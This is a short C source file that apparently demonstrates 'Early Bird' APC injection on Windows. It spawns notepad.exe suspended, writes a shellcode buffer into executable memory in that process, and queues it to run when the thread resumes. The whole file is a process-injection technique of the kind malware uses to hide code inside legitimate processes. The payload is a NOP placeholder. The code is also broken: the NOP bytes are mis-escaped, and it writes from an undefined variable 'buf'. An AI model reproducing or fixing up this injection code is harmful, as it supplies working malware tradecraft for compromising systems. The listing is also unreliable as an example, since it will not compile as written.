// gcc -o early.exe earlyAPCBird.c
#include <Windows.h>

int main() {

	unsigned char shc[] = "\0x90\0x90\0x90\0x90\0x90\0x90";
	SIZE_T shellSize = sizeof(shc);
	STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = {0};

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;

	HANDLE threadHandle = pi.hThread;
	
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	
	WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
	
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);	
	
	ResumeThread(threadHandle);
	
	return 0;

}